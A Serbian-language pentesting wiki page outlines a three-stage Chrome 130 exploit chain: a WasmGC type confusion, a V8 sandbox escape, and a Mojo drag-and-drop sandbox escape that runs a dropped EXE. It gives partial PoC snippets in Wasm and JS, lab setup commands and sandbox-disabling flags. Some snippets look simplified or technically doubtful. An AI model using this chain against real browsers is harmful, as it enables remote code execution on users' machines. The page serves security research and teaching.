# Eksploatacija Chrome-a

{{#include ../banners/hacktricks-training.md}}

> Ova stranica pruža visokonivovski, ali praktičan pregled modernog "full-chain" exploitation workflow-a usmerenog protiv Google Chrome 130, zasnovan na istraživačkom serijalu “101 Chrome Exploitation” (Part-0 — Preface).
> Cilj je da pentesterima i exploit-developersima pruži minimalno potrebno znanje da reprodukuju ili prilagode tehnike za sopstvena istraživanja.

## 1. Pregled arhitekture Chrome-a
Razumevanje attack surface zahteva poznavanje gde se code izvršava i koji sandboxes se primenjuju.

<details>
<summary>Raspored Chrome procesa & sandbox-a</summary>
```text
+-------------------------------------------------------------------------+
|                             Chrome Browser                              |
|                                                                         |
|  +----------------------------+      +-----------------------------+    |
|  |      Renderer Process      |      |    Browser/main Process     |    |
|  |  [No direct OS access]     |      |  [OS access]                |    |
|  |  +----------------------+   |      |                             |    |
|  |  |    V8 Sandbox        |   |      |                             |    |
|  |  |  [JavaScript / Wasm] |   |      |                             |    |
|  |  +----------------------+   |      |                             |    |
|  +----------------------------+      +-----------------------------+    |
|               |           IPC/Mojo              |                       |
|               V                                    |                     |
|  +----------------------------+                   |                     |
|  |        GPU Process         |                   |                     |
|  |  [Restricted OS access]    |                   |                     |
|  +----------------------------+                   |                     |
+-------------------------------------------------------------------------+
```
</details>

Višeslojna odbrana u dubinu:

* **V8 sandbox** (Isolate): dozvole za memoriju su ograničene da bi se sprečilo proizvoljno čitanje/pisanje iz JITed JS / Wasm.
* **Renderer ↔ Browser split** je obezbeđen preko **Mojo/IPC** message passing; renderer nema *nativan* FS/network pristup.
* **OS sandboxes** dodatno ograničavaju svaki proces (Windows Integrity Levels / `seccomp-bpf` / macOS sandbox profiles).

Dakle, *remote* napadač treba **tri** uzastopne primitive:

1. Memory corruption unutar V8 da bi se dobilo **arbitrary RW inside the V8 heap**.
2. Druga ranjivost koja omogućava napadaču da **escape the V8 sandbox to full renderer memory**.
3. Konačno sandbox-escape (često logički, a ne oštećenjem memorije) da izvrši kod **outside of the Chrome OS sandbox**.

---

## 2. Faza 1 – WebAssembly Type-Confusion (CVE-2025-0291)

Propust u TurboFan-ovoj optimizaciji **Turboshaft** pogrešno klasifikuje **WasmGC reference types** kada se vrednost proizvede i potroši unutar *single basic block loop*.

Efekat:
* Kompajler **preskače type-check**, tretirajući *reference* (`externref/anyref`) kao *int64*.
* Specijalno izrađen Wasm omogućava preklapanje JS object header-a sa podacima koje kontroliše napadač → <code>addrOf()</code> & <code>fakeObj()</code> **AAW / AAR primitives**.

Minimalni PoC (izvadak):
```WebAssembly
(module
(type $t0 (func (param externref) (result externref)))
(func $f (param $p externref) (result externref)
(local $l externref)
block $exit
loop $loop
local.get $p      ;; value with real ref-type
;; compiler incorrectly re-uses it as int64 in the same block
br_if $exit       ;; exit condition keeps us single-block
br   $loop
end
end)
(export "f" (func $f)))
```
Pokreni optimizaciju & spray objects iz JS:
```js
const wasmMod = new WebAssembly.Module(bytes);
const wasmInst = new WebAssembly.Instance(wasmMod);
const f = wasmInst.exports.f;

for (let i = 0; i < 1e5; ++i) f({});   // warm-up for JIT

// primitives
let victim   = {m: 13.37};
let fake     = arbitrary_data_backed_typedarray;
let addrVict = addrOf(victim);
```
Outcome: **arbitrary read/write within V8**.

---

## 3. Faza 2 – Escaping the V8 Sandbox (issue 379140430)

Kada se Wasm funkcija kompajlira u Tier-Up, generiše se **JS ↔ Wasm wrapper**. A signature-mismatch bug uzrokuje da wrapper upiše preko kraja poverljivog **`Tuple2`** objekta kada se Wasm funkcija re-optimizuje *dok je još uvek na steku*.

Prepisivanjem 2 × 64-bit polja `Tuple2` objekta dobija se **read/write on any address inside the Renderer process**, čime se efektivno zaobilazi V8 sandbox.

Key steps in exploit:
1. Dovesti funkciju u **Tier-Up** stanje naizmeničnim korišćenjem turbofan/baseline code.
2. Pokrenuti tier-up dok se održava referenca na steku (`Function.prototype.apply`).
3. Koristiti Stage-1 AAR/AAW da se pronađe i pokvari susedni `Tuple2`.

Wrapper identification:
```js
function wrapperGen(arg) {
return f(arg);
}
%WasmTierUpFunction(f);          // force tier-up (internals-only flag)
wrapperGen(0x1337n);
```
Nakon korupcije posedujemo potpuno opremljen **renderer R/W primitive**.

---

## 4. Stage 3 – Renderer → OS Sandbox Escape (CVE-2024-11114)

IPC interfejs **Mojo** `blink.mojom.DragService.startDragging()` može biti pozvan iz Renderer-a sa *delimično pouzdanim* parametrima. Kreiranjem `DragData` strukture koja pokazuje na **proizvoljnu putanju fajla** renderer ubeđuje browser da izvrši *native* drag-and-drop **outside the renderer sandbox**.

Zloupotrebom ovoga možemo programski “drag” maliciozni EXE (prethodno postavljen u world-writable lokaciju) na Desktop, gde Windows automatski izvršava određene tipove fajlova nakon što su spušteni.

Primer (pojednostavljeno):
```js
const payloadPath = "C:\\Users\\Public\\explorer.exe";

chrome.webview.postMessage({
type: "DragStart",
data: {
title: "MyFile",
file_path: payloadPath,
mime_type: "application/x-msdownload"
}
});
```
Nije potrebna dodatna korupcija memorije – **logička greška** nam omogućava proizvoljno izvršavanje fajlova sa privilegijama korisnika.

---

## 5. Potpuni tok lanca

1. **Korisnik posećuje** zlonamernu web stranicu.
2. **Faza 1**: Wasm module iskorišćava CVE-2025-0291 → V8 heap AAR/AAW.
3. **Faza 2**: Wrapper mismatch korumpira `Tuple2` → izlazak iz V8 sandbox-a.
4. **Faza 3**: `startDragging()` IPC → izlazak iz OS sandbox-a i izvršavanje payload-a.

Rezultat: **Remote Code Execution (RCE)** na hostu (Chrome 130, Windows/Linux/macOS).

---

## 6. Podešavanje lab-a i debagovanja
```bash
# Spin-up local HTTP server w/ PoCs
npm i -g http-server
git clone https://github.com/Petitoto/chromium-exploit-dev
cd chromium-exploit-dev
http-server -p 8000 -c -1

# Windows kernel debugging
"C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\windbgx.exe" -symbolpath srv*C:\symbols*https://msdl.microsoft.com/download/symbols
```
Korisni flagovi za pokretanje *development* build-a za Chrome:
```bash
chrome.exe --no-sandbox --disable-gpu --single-process --js-flags="--allow-natives-syntax"
```
## 7. Renderer → kernel escape resource

Kada renderer exploit zahteva kernel pivot koji ostaje unutar seccomp profila, zloupotreba AF_UNIX `MSG_OOB` sockets koji su i dalje dostupni unutar sandbox-a obezbeđuje deterministički put. Proverite Linux kernel exploitation case-study ispod za SKB UAF → kernel RCE chain:

{{#ref}}
linux-kernel-exploitation/af-unix-msg-oob-uaf-skb-primitives.md
{{#endref}}

---

## Zaključci

* **WebAssembly JIT bugs** ostaju pouzdana ulazna tačka – sistem tipova je još mlad.
* Dobijanje drugog memory-corruption buga unutar V8 (npr. wrapper mismatch) znatno pojednostavljuje **V8-sandbox escape**.
* Logičke slabosti u privilegovanim Mojo IPC interfejsima često su dovoljne za **final sandbox escape** – obratite pažnju na *non-memory* bugove.

## Reference
- [101 Chrome Exploitation — Part 0 (Preface)](https://opzero.ru/en/press/101-chrome-exploitation-part-0-preface/)
- [Chromium security architecture](https://chromium.org/developers/design-documents/security)
{{#include ../banners/hacktricks-training.md}}
